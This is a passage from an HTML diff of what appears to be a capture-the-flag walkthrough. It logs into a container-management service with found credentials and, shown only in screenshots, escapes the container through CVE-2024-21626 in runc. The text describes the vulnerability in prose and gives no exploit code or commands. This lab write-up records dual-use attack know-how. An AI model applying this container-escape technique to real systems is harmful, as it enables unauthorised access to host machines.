+<img src="/assets/images/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778_Untitled_17.png" alt="Untitled" />
+<br /><br />
+Again there is a log in interface, this time we tried with Andrew credentials.
+<br /><br />
+<img src="/assets/images/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778_Untitled_18.png" alt="Untitled" />
+<br /><br />
+The services allows to create containers and manage them
+<br /><br />
+<img src="/assets/images/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778_Untitled_19.png" alt="Untitled" />
+<br /><br />
+This version has a vulnerability which we can exploit it through container creation process
+<br /><br /></p>
+<ul>
+  <li>CVE-2024-21626
+<br /><br />
+  runc is a CLI(command line interface) tool for spawning and running containers on Linux according to the OCI(Open Container Initiative). In runc 1.1.11 and earlier, due to an internal file descriptor (Resources which are used access files) leak, an attacker could cause a newly-spawned container process (from runc exec) to have a working directory in the host filesystem namespace, allowing for a container escape by giving access to the host filesystem. The same attack could be used by a malicious image to allow a container process to gain access to the host filesystem through runc. Variants of these attacks could be also be used to overwrite semi-arbitrary host binaries, allowing for complete container escapes.
+<br /><br />
+<img src="/assets/images/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778_Untitled_20.png" alt="Untitled" />
+<br /><br />
+<img src="/assets/images/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778_Untitled_21.png" alt="Untitled" />
+<br /><br />
+<img src="/assets/images/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778_Untitled_22.png" alt="Untitled" />
+<br /><br />
+<img src="/assets/images/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778_Untitled_23.png" alt="Untitled" />
+<br /><br />
+<img src="/assets/images/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778_Untitled_24.png" alt="Untitled" />
+<br /><br />
+Machine pwned@W
+<script src="/assets/js/matrix-overlay.js"></script></li>
+</ul>
 
 <link rel="stylesheet" href="/assets/css/imagesstyle.css" />
 
